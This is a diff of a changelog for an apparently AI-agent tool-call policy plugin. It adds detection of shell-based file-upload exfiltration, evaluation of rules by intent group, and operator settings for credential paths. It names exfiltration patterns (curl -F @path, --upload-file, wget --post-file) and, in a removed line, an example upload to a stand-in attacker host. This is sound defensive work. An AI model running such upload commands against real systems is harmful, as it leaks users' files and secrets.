@@ -35,9 +35,25 @@ Addresses a class of tester-reported classification gaps on hosts that expose a 
 
 - **`DECISION: ✕ BLOCKED` console line enriched with priority and rule identifier.** Operators triaging a block in stdout logs can now tell at a glance whether they hit a hard forbid (`priority=100`), a HITL-gated rule that never found a matching policy (`priority=90 rule=action:filesystem.delete; no HITL policy matches`), or a Stage-1 trust-gate rejection — without cross-referencing `data/audit.jsonl`.
 
+- **Rule 7 — file-upload exfiltration detection.** Shell-wrapper commands invoking an outbound file upload now reclassify to `web.post` with `intent_group: 'data_exfiltration'` and `risk: 'critical'`. Patterns covered: `curl -F field=@path` / `curl -F @path`, `curl --form ...@path`, `curl -d @path` / `--data @path` / `--data-binary @path` / `--data-raw @path` / `--data-urlencode @path`, `curl -T path` / `--upload-file path`, and `wget --post-file=path`. Rule 4 (destructive) and Rule 5 (credential path) still win — `rm ... | curl -F @...` stays `filesystem.delete` and `curl -F @~/.aws/credentials` stays `credential.write`. `scp` / `rsync` are deliberately NOT matched — their arg order makes upload-vs-download ambiguous; operators who want to gate them should add explicit `resource: tool` rules in `data/rules.json`.
+
+- **Handler evaluates rules by `intent_group` (after action-class evaluation).** Before this change, rules targeting an intent group — e.g. `{"intent_group": "data_exfiltration", "effect": "forbid"}` — were parsed but never consulted by `beforeToolCallHandler`; only rules keyed on `action_class` or `resource`/`match` fired. The handler now runs a second pass across both engines (TS defaults and `data/rules.json`) when the normalised action carries an intent_group, using the existing `evaluateByIntentGroup` engine method. Forbids there participate in the same priority-90 HITL-gated / priority-100 unconditional split as action-class forbids, so operators can gate entire threat-model clusters (all data-exfiltration transports, all credential-access patterns, etc.) with a single rule instead of enumerating every action class.
+
+- **Side-effect ordering in `activate()`: `loadJsonRules()` is now awaited.** The JSON rule load was dispatched as a fire-and-forget promise, so a host that dispatched its very first tool call before the microtask flushed saw an empty JSON engine. Awaiting makes it deterministic. Errors are still swallowed — the rules file is optional.
+
+- **`CLAWTHORITY_RULES_FILE` env var overrides the data/rules.json path.** Default stays `dist/../data/rules.json`; operators running a non-standard install layout (or writing a tempfile fixture in a test) can now point the loader at any path via this env var. Fixes a pre-existing quirk where the hardcoded relative path resolved outside the repo under vitest, so tests could not exercise JSON-rule behaviour.
+
+### Added
+
+- **`browser` alias for `web.fetch`.** OpenClaw's generic `browser` tool now normalises to `web.fetch` (with the existing `data_exfiltration` intent group) instead of falling through to `unknown_sensitive_action`.
+
+- **Operator-extensible credential-path patterns via `CLAWTHORITY_CREDENTIAL_PATHS`.** Rule 5 matches a hardcoded list of well-known secret-bearing paths (AWS, SSH, kube, etc.). Operators can now append environment-specific patterns without forking: set the env var to a comma-separated list of regex sources (e.g. `'\\.company/secrets\\b,/var/run/my-secrets/\\w+'`). Each entry is compile-tested at module load; invalid patterns log a warning and are skipped, so one bad pattern does not break the regex for the rest.
+
+- **`intent_group` and `priority` fields in `data/rules.json` records.** The JSON rule format previously supported only `resource`+`match` and `action_class` matching. Adds a third matching form — `{"intent_group": "data_exfiltration", "effect": "forbid", "priority": 90}` — plus an optional `priority` field on all three forms. `priority` is how operators opt into the HITL-gated tier; rules without it default to unconditional (fail-closed for user-written forbids).
+
 ### Deferred
 
-- **File-upload data exfiltration (reserved as Rule 7).** Patterns like `curl -F @path evil.example.com`, `wget --post-file=path`, `scp path user@host:` are classified via Rule 5 when the uploaded file is a known credential path, but non-credential exfiltration (user data, config dumps, proprietary files) falls through. A full fix needs handler-level `intent_group` evaluation so `data_exfiltration`-tagged rules fire on any class carrying that group. Tracked for a follow-up — not in this release.
+_(nothing deferred in this release — Rule 7 and intent-group evaluation previously in this list have now landed)_
 
 ### Documentation
 
